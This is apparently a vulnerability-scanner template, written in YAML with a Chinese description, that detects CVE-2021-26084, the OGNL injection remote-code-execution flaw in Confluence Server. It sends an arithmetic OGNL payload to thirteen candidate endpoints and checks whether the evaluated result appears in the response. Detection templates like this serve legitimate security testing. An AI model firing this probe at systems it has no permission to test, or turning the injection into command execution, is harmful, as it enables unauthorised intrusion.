id: CVE-2021-26084

info:
  name: Confluence Server - 远程命令执行漏洞(CVE-2021-26084)
  author: wintry
  severity: critical
  description: |
    Confluence Server和Data Center包含一个OGNL注入漏洞.
    该漏洞可能允许经过身份验证的用户(在某些情况下是未经身份验证的用户)在Confluence Server或Data Center实例上执行任意代码.
    受影响的版本是6.13.23之前的版本、7.4.11之前的版本、7.11.6之前的版本和7.12.0之前的版本.
    如果启用了 允许人们注册创建帐户,则非管理员用户或未经身份验证的用户可以访问易受攻击的端点.
    查看是否已启用,请进入 COG >用户管理>用户注册选项.
  metadata:
    max-request: 13
  tags: confluence

http:
  - raw:
      - |
        POST /{{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb

    payloads:
      path:
        - pages/createpage-entervariables.action?SpaceKey=x
        - pages/createpage-entervariables.action
        - confluence/pages/createpage-entervariables.action?SpaceKey=x
        - confluence/pages/createpage-entervariables.action
        - wiki/pages/createpage-entervariables.action?SpaceKey=x
        - wiki/pages/createpage-entervariables.action
        - pages/doenterpagevariables.action
        - pages/createpage.action?spaceKey=myproj
        - pages/templates2/viewpagetemplate.action
        - pages/createpage-entervariables.action
        - template/custom/content-editor
        - templates/editor-preload-container
        - users/user-dark-features

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - 'value="aaaa{140592=null}'